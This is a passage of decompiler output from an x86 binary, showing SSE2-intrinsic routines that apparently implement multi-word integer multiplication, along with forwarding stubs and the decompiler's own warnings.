  v516 = _mm_mul_epu32(v513, *v515);
  v517 = _mm_load_si128(&stru_46C990);
  v518 = _mm_and_si128(v517, v514);
  v519 = _mm_add_epi32(v511, _mm_srli_epi32(v514, 0x10u));
  v520 = _mm_and_si128(v517, v516);
  v521 = _mm_srli_epi32(v516, 0x10u);
  v522 = _mm_move_epi64(v520);
  v523 = _mm_move_epi64(v521);
  v524 = _mm_add_epi32(
           _mm_add_epi32(v512, v518),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v520, v522), v522), 4));
  v525 = _mm_add_epi32(v519, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v521, v523), v523), 4));
  *(_DWORD *)(v509 + 240) = _mm_cvtsi128_si32(v524);
  v526 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v524), 0x10u), _mm_move_epi64(v525));
  *(_QWORD *)(v509 + 242) = v526.m128i_i64[0];
  *(_QWORD *)(v509 + 248) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v524, v522), _mm_srli_epi64(v526, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v525, v522), 0x10u)).m128i_u64[0];
}
// 4143E4: variable 'v33' is possibly undefined
// 41441B: variable 'v39' is possibly undefined
// 414474: variable 'v50' is possibly undefined
// 41449B: variable 'v54' is possibly undefined
// 414507: variable 'v67' is possibly undefined
// 41453E: variable 'v73' is possibly undefined
// 414597: variable 'v84' is possibly undefined
// 4145BE: variable 'v88' is possibly undefined
// 41462A: variable 'v101' is possibly undefined
// 414661: variable 'v107' is possibly undefined
// 4146BA: variable 'v118' is possibly undefined
// 4146E1: variable 'v122' is possibly undefined
// 41474D: variable 'v135' is possibly undefined
// 414784: variable 'v141' is possibly undefined
// 4147DD: variable 'v152' is possibly undefined
// 414804: variable 'v156' is possibly undefined
// 414870: variable 'v169' is possibly undefined
// 4148A7: variable 'v175' is possibly undefined
// 414900: variable 'v186' is possibly undefined
// 414927: variable 'v190' is possibly undefined
// 414993: variable 'v203' is possibly undefined
// 4149CA: variable 'v209' is possibly undefined
// 414A23: variable 'v220' is possibly undefined
// 414A4A: variable 'v224' is possibly undefined
// 414AB6: variable 'v237' is possibly undefined
// 414AED: variable 'v243' is possibly undefined
// 414B46: variable 'v254' is possibly undefined
// 414B6D: variable 'v258' is possibly undefined
// 414BD9: variable 'v271' is possibly undefined
// 414C10: variable 'v277' is possibly undefined
// 414C69: variable 'v288' is possibly undefined
// 414C96: variable 'v292' is possibly undefined
// 414D02: variable 'v305' is possibly undefined
// 414D3F: variable 'v311' is possibly undefined
// 414D98: variable 'v322' is possibly undefined
// 414DC5: variable 'v326' is possibly undefined
// 414E31: variable 'v339' is possibly undefined
// 414E6E: variable 'v345' is possibly undefined
// 414EC7: variable 'v356' is possibly undefined
// 414EF4: variable 'v360' is possibly undefined
// 414F60: variable 'v373' is possibly undefined
// 414F9D: variable 'v379' is possibly undefined
// 414FF6: variable 'v390' is possibly undefined
// 415023: variable 'v394' is possibly undefined
// 41508F: variable 'v407' is possibly undefined
// 4150CC: variable 'v413' is possibly undefined
// 415125: variable 'v424' is possibly undefined
// 415152: variable 'v428' is possibly undefined
// 4151BE: variable 'v441' is possibly undefined
// 4151FB: variable 'v447' is possibly undefined
// 415254: variable 'v458' is possibly undefined
// 415281: variable 'v462' is possibly undefined
// 4152ED: variable 'v475' is possibly undefined
// 41532A: variable 'v481' is possibly undefined
// 415383: variable 'v492' is possibly undefined
// 4153B0: variable 'v496' is possibly undefined
// 41541C: variable 'v509' is possibly undefined
// 415457: variable 'v515' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 413EC9: using guessed type __m128i anonymous_27;

//----- (00413F89) --------------------------------------------------------
int sub_413F89()
{
  return sub_413FC9();
}
// 413FC9: using guessed type int sub_413FC9(void);

//----- (00413FC9) --------------------------------------------------------
int sub_413FC9()
{
  return sub_414006();
}
// 414006: using guessed type int sub_414006(void);

//----- (00414006) --------------------------------------------------------
int sub_414006()
{
  return sub_414043();
}
// 414043: using guessed type int sub_414043(void);

//----- (00414043) --------------------------------------------------------
int sub_414043()
{
  return sub_414080();
}
// 414080: using guessed type int sub_414080(void);

//----- (00414080) --------------------------------------------------------
int sub_414080()
{
  return sub_4140BD();
}
// 4140BD: using guessed type int sub_4140BD(void);

//----- (004140BD) --------------------------------------------------------
int sub_4140BD()
{
  return sub_4140FA();
}
// 4140FA: using guessed type int sub_4140FA(void);

//----- (004140FA) --------------------------------------------------------
int sub_4140FA()
{
  return sub_414137();
}
// 414137: using guessed type int sub_414137(void);

//----- (00414137) --------------------------------------------------------
int sub_414137()
{
  return sub_414174();
}
// 414174: using guessed type int sub_414174(void);

//----- (00414174) --------------------------------------------------------
int sub_414174()
{
  return sub_4141B1();
}
// 4141B1: using guessed type int sub_4141B1(void);

//----- (004141B1) --------------------------------------------------------
int sub_4141B1()
{
  return sub_4141EE();
}
// 4141EE: using guessed type int sub_4141EE(void);

//----- (004141EE) --------------------------------------------------------
int sub_4141EE()
{
  return sub_41422B();
}
// 41422B: using guessed type int sub_41422B(void);

//----- (0041422B) --------------------------------------------------------
int sub_41422B()
{
  return sub_414268();
}
// 414268: using guessed type int sub_414268(void);

//----- (00414268) --------------------------------------------------------
int sub_414268()
{
  return sub_4142A5();
}
// 4142A5: using guessed type int sub_4142A5(void);

//----- (004142A5) --------------------------------------------------------
int sub_4142A5()
{
  return sub_4142E2();
}
// 4142E2: using guessed type int sub_4142E2(void);

//----- (004142E2) --------------------------------------------------------
__m128i __usercall sub_4142E2@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (004154EC) --------------------------------------------------------
void __cdecl sub_4154EC(int a1, int a2, int a3)
{
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm2
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  __m128i v50; // xmm6
  __m128i v51; // [esp+10h] [ebp-6Ch] BYREF
  __m128i v52; // [esp+20h] [ebp-5Ch] BYREF
  __m128i v53; // [esp+30h] [ebp-4Ch]
  __m128i v54; // [esp+40h] [ebp-3Ch]
  __m128i v55; // [esp+50h] [ebp-2Ch] BYREF
  __m128i v56; // [esp+60h] [ebp-1Ch] BYREF

  for ( i = 0; i != 16; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v51 + 2 * i) = v4;
    *(__m128i *)((char *)&v52 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v53 + 2 * i) = v5;
    *(__m128i *)((char *)&v54 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v55 + 2 * i) = v6;
    *(__m128i *)((char *)&v56 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v55);
  v8 = _mm_mul_epu32(_mm_load_si128(&v51), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v53);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v55);
  v22 = _mm_mul_epu32(_mm_load_si128(&v52), v21);
  v23 = _mm_mul_epu32(v21, v54);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_415591((int)&v52, &v55);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v56);
  v38 = _mm_mul_epu32(_mm_load_si128(&v52), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_and_si128(v41, v38);
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(_mm_add_epi32(v36, v42), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v33 + 16) = _mm_cvtsi128_si32(v48);
  v50 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  *(_QWORD *)(v33 + 18) = v50.m128i_i64[0];
  *(_QWORD *)(v33 + 24) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v50, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v49, v46), 0x10u)).m128i_u64[0];
}
// 415693: variable 'v33' is possibly undefined
// 4156C8: variable 'v39' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 4154EC: using guessed type __m128i var_1C;

//----- (00415591) --------------------------------------------------------
__m128i __usercall sub_415591@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00415754) --------------------------------------------------------
void __cdecl sub_415754(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm2
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128i v116; // xmm4
  __m128i v117; // xmm5
  __m128i v118; // xmm6
  __m128i v119; // [esp+10h] [ebp-CCh] BYREF
  __m128i v120; // [esp+20h] [ebp-BCh] BYREF
  __m128i v121; // [esp+30h] [ebp-ACh] BYREF
  __m128i v122; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v123; // [esp+50h] [ebp-8Ch]
  __m128i v124[3]; // [esp+60h] [ebp-7Ch]
  __m128i v125; // [esp+90h] [ebp-4Ch] BYREF
  __m128i v126; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v127; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v128; // [esp+C0h] [ebp-1Ch] BYREF

  for ( i = 0; i != 32; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v119 + 2 * i) = v4;
    *(__m128i *)((char *)&v120 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v123 + 2 * i) = v5;
    v124[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v125 + 2 * i) = v6;
    *(__m128i *)((char *)&v126 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v125);
  v8 = _mm_mul_epu32(_mm_load_si128(&v119), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v123);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v125);
  v22 = _mm_mul_epu32(_mm_load_si128(&v120), v21);
  v23 = _mm_mul_epu32(v21, v124[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_415882((int)&v120, &v125);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v126);
  v38 = _mm_mul_epu32(_mm_load_si128(&v120), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_46C990);
  v42 = _mm_add_epi32(v36, _mm_and_si128(v41, v38));
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  sub_415845();
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v50 + 16) = _mm_cvtsi128_si32(v48);
  v51 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  v52 = _mm_unpackhi_epi64(v49, v46);
  *(_QWORD *)(v50 + 18) = v51.m128i_i64[0];
  v53 = _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v51, 0x30u));
  v55 = _mm_load_si128(&v126);
  v56 = _mm_mul_epu32(_mm_load_si128(&v121), v55);
  v57 = _mm_mul_epu32(v55, v54[1]);
  v58 = _mm_load_si128(&stru_46C990);
  v59 = _mm_add_epi32(v53, _mm_and_si128(v58, v56));
  v60 = _mm_add_epi32(v52, _mm_srli_epi32(v56, 0x10u));
  v61 = _mm_and_si128(v58, v57);
  v62 = _mm_srli_epi32(v57, 0x10u);
  sub_415808();
  v63 = _mm_move_epi64(v61);
  v64 = _mm_move_epi64(v62);
  v65 = _mm_add_epi32(v59, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v61, v63), v63), 4));
  v66 = _mm_add_epi32(v60, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v62, v64), v64), 4));
  *(_DWORD *)(v67 + 24) = _mm_cvtsi128_si32(v65);
  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v127);
  v72 = _mm_mul_epu32(_mm_load_si128(&v121), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_46C990);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_415845();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v127);
  v90 = _mm_mul_epu32(_mm_load_si128(&v122), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_46C990);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_415882((int)&v122, &v127);
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v128);
  v106 = _mm_mul_epu32(_mm_load_si128(&v122), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_46C990);
  v110 = _mm_and_si128(v109, v106);
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(
           _mm_add_epi32(v104, v110),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v101 + 48) = _mm_cvtsi128_si32(v116);
  v118 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  *(_QWORD *)(v101 + 50) = v118.m128i_i64[0];
  *(_QWORD *)(v101 + 56) = _mm_add_epi64(
                             _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v118, 0x30u)),
                             _mm_slli_epi64(_mm_unpackhi_epi64(v117, v114), 0x10u)).m128i_u64[0];
}
// 415984: variable 'v33' is possibly undefined
// 4159BB: variable 'v39' is possibly undefined
// 415A14: variable 'v50' is possibly undefined
// 415A3B: variable 'v54' is possibly undefined
// 415AA7: variable 'v67' is possibly undefined
// 415ADE: variable 'v73' is possibly undefined
// 415B37: variable 'v84' is possibly undefined
// 415B5E: variable 'v88' is possibly undefined
// 415BCA: variable 'v101' is possibly undefined
// 415BFF: variable 'v107' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 415754: using guessed type __m128i anonymous_3;

//----- (00415808) --------------------------------------------------------
int sub_415808()
{
  return sub_415845();
}
// 415845: using guessed type int sub_415845(void);

//----- (00415845) --------------------------------------------------------
int sub_415845()
{
  return sub_415882();
}
// 415882: using guessed type int sub_415882(void);

//----- (00415882) --------------------------------------------------------
__m128i __usercall sub_415882@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00415C8B) --------------------------------------------------------
int __cdecl sub_415C8B(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  int v50; // ecx
  __m128i v51; // xmm6
  __m128i v52; // xmm5
  __m128i v53; // xmm4
  __m128i *v54; // edx
  __m128i v55; // xmm7
  __m128i v56; // xmm0
  __m128i v57; // xmm7
  __m128i v58; // xmm6
  __m128i v59; // xmm4
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm7
  __m128i v63; // xmm0
  __m128i v64; // xmm1
  __m128i v65; // xmm4
  __m128i v66; // xmm5
  int v67; // ecx
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm4
  __m128i v71; // xmm7
  __m128i v72; // xmm0
  __m128i *v73; // edx
  __m128i v74; // xmm7
  __m128i v75; // xmm6
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm6
  __m128i v79; // xmm7
  __m128i v80; // xmm0
  __m128i v81; // xmm1
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  int v84; // ecx
  __m128i v85; // xmm6
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i *v88; // edx
  __m128i v89; // xmm7
  __m128i v90; // xmm0
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm4
  __m128i v94; // xmm5
  __m128i v95; // xmm6
  __m128i v96; // xmm7
  __m128i v97; // xmm0
  __m128i v98; // xmm1
  __m128i v99; // xmm4
  __m128i v100; // xmm5
  int v101; // ecx
  __m128i v102; // xmm6
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm7
  __m128i v106; // xmm0
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm4
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm7
  int result; // eax
  __m128i v115; // xmm0
  __m128i v116; // xmm1
  __m128i v117; // xmm4
  __m128i v118; // xmm5
  __m128 v119; // xmm7
  int v120; // ecx
  __m128i v121; // xmm6
  __m128i v122; // xmm4
